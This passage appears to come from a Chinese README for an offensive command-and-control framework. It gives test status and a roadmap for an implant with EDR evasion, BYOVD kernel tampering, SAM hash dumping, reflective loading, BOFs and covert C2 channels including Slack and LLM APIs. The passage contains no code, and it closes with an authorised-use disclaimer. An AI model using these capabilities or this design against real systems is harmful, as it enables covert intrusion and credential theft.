| **GUI 渲染盲点** | 🟡 部分 | `image`/`channel`/`file` 结果是占位符;`ProcessTable.tsx` 死文件;`fetch_profile` 定义但前端未调。 |
| **Win11 25H2 真机** | 🟡 暂缓 | 需 CET+HVCI 物理机。 |
| **sessions 持久化** | ✅ 完整 | SQLite durability layer,boot 恢复,2026-07-16 实测重启同 id 复原;每帧持久化 `send_counter`/`last_recv`。 |

---

## 真机验证状态

| 目标环境 | 测试项 | 结果 |
|---|---|---|
| Windows Server 2019(17763.1339)+ Defender ON | 完整 beacon 循环(加密 check-in → 任务 → 执行 → 加密回传) | ✅ |
| 同上 | selftest(`scripts/win_selftest_all.ps1`) | ✅ |
| 同上 | 内核 SDK(BYOVD + ETW-TI + DKOM + 回调中和) | ✅ |
| 同上 | /screenshot 跨会话(Session 0 → 2) | ✅ |
| 同上 | /hashdump SAM + SYSTEM hive | ✅ |
| Win11 24H2(build 26100,CI runner) | 编译无回归 | ✅ |
| GitHub 托管 windows-latest(Server 2025) | 反射加载 blob E2E(fixture + 真实 implant DLL,CreateThread 入口,DllMain marker) | ✅(2026-08-02) |
| GitHub 托管 windows-latest(公有测试仓库镜像) | **CI 全量 12/12 绿**:fmt/clippy/workspace+standalone 测试/UI build/loader-emu/qiling/impersonation/windows-ci 全链/g6/p4-p5/kself | ✅(2026-08-09) |
| 同上 | **9 个 selftest 导出经控制台探针真跑**(替代 Session 0 挂死的 rundll32;`bof_isolated=7 (0b0111)`、`syscall_rt=3`、`postex=15`) | ✅(2026-08-09) |
| 同上 | **B3 隔离 BOF 链**:`bof_print.o` 经牺牲子进程管道回传 `BOF-PRINT-OK`;注入链探针;syscall_rt 探针 | ✅(2026-08-09) |
| Qiling 仿真(macos runner) | selftest 导出可行性矩阵 **6/6**(含修复后的 `nyx_selftest_env`) | ✅(2026-08-09) |
| Win11 25H2 CET+HVCI 物理机 | SPOOF_SWAP CET 修复缝 / HVCI 硬件触发 | 🟡 需物理机 |
| macOS(team server + agent-dev + GUI) | 协议循环 + 操作端 | ✅(本次审计期间实测 server 运行 + 真实 beacon 会话) |

---

## Roadmap

- **睡眠混淆默认化** — `kits::sleep` 已条件接线(evasion+enabled 时走 `fluctuation::sleep`,`kits.rs:75-81`);待办:noevasion 模式下的安全掩码(helper-thread `.text` 掩码恢复,`mem.rs:249-253`)。
- **nyx-loader UDRL 强化** — 真实 layer-2 已交付并经真机验证(`crates/loader-probe-exe` CreateThread 探针 + DllMain marker,2026-08-02);待办:PE 头擦除、`.pdata` 处理、section 权限收敛、分段投递(Stage0→Stage1→Stage2,对齐 CS UDRL 生态)。
- **BOF API 扩面(剩余)** — datap 解析族/`BeaconIsAdmin`/`BeaconGetSpawnTo`/`BeaconOutput` 已交付并经 wine64 实测(2026-08-10,`bof-runner/src/shim.rs`);待办:token/spawn/inject 类(`BeaconUseToken`/`BeaconSpawnTemporaryProcess`/`BeaconInjectProcess`/`BeaconFormatAlloc` 等)与 spawn-to 可配置化。
- **transport/ 剩余 4 通道接线** — Slack/MCP 已接 server 中转(boot-time `TransportStack`,`extc2_relay.rs`);待办:malleable/doh_dns/llm_api/smb_pipe 接 server 路由。implant 侧保持自滚通道(no_std PIC 设计,非目标)。
- **TLS 指纹 emitter 落地** — `impersonation` feature 已提供 BoringSSL(`wreq`)实现(`fingerprint.rs:201-211`);待办:接入 server 出站链路并在默认构建启用。
- **PatchGuard 偏移验证** — 用 PDB 校验 PRCB/context 偏移,或改用 Outflank Peekaboo 时序法。
- **caller-spoof CET 路径** — 宏已实现(`caller_spoof.rs:464-499`);待办:CET 主机上的真 spoof(IRET_FRAME/shadow-stack surgery;当前检测到 CET 时降级 `call_plain`)。
- **GUI 会话元数据 overlay** — rename / tag / star / alias(TUI 曾有,GUI 无)。
- **CET 物理机验证** — Win11 25H2 CET+HVCI 真机 + `#CP` 修复缝(`KiControlProtectionFault` + `RtlRestoreContext`)。
- **SQLite migration 继续演化** — schema_version 迁移已启用(session_store `send_counter`/`last_recv`);其余表结构演化按需推进。

---

## 免责声明

本项目仅用于授权安全测试和研究目的。**请勿在未明确授权的系统上部署或运行。** 所有内核绕过、注入、凭据提取能力仅限于合法授权的红队 / 渗透测试场景。
